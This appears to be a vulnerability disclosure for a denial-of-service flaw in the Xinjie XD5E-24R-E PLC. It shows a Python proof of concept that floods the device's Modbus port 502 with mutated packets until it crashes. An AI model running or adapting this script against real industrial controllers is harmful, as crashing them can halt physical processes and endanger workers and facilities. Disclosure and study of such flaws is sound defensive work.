# Summary
Xinjie PLC XD5E-24R-E has a denial of service vulnerability. An attacker can send a large number of data packets to cause the PLC to crash.

# Details
Connectivity test of the device:![image](https://github.com/user-attachments/assets/170d5807-3800-4057-a952-4500746c0b37)

Nmap scans device ports:![image](https://github.com/user-attachments/assets/c1f567c7-ee5a-451d-88a5-d82f0f26b3eb)

You can see that port 502 is open.

Then we run the script:![image](https://github.com/user-attachments/assets/15afc01c-fdde-4cc6-b79c-62c8f5cdc58e)

Soon you will see the device crash. ![image](https://github.com/user-attachments/assets/8c3c17f2-2deb-458c-ad21-57418130d816)


# PoC
My host ip is `192.168.6.10` and the device's ip is `192.168.6.6`.

```py
import socket

def F1(x):
    return x ^ 0xFF
    pass
def F2(x):
    return x ^ 0xFE
    pass
def F3(x):
    return (x-0x10) & 0xFF
    pass
def F4(x):
    return (x*0x17) & 0xFF
    pass

def F5(x):
    return (x**2) & 0xFF

def Change(data: bytes):
    l = len(data)
    import random
    pos = 0
    while ((pos==0) or (pos == 20)):
        pos = random.randint(0, l - 1) 
    Fs = [F1, F2, F3, F4, F5]
    f = random.randint(0, 4)  
    func = Fs[f]
    newX = func(data[pos])

    hex_str = format(newX, '02x')
    data = data[:pos] + bytes.fromhex(hex_str) + data[pos + 1:]

    return data

ori = "000100000006010300000064"
ori = bytes.fromhex(ori)
queue = []

queue.append(ori)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.6.6",502))
MAX_LEN = 65536
cur = 0
first = False
while True:
    if((cur)%100 == 0):
        print(cur,end=' ')
    for i in range(8):
        top = queue[cur]
        now = Change(top)
        queue.append(now)
        try:
            s.send(now)
        except:
            if first == False:
                print()
                print("\033[91m[+] CRASHED!!!!!!!!!!!!!!!!!!\033[0m")
    cur = (cur + 1) % MAX_LEN
```
# Discoverer
ylqncepu@163.com

https://github.com/N0zoM1z0
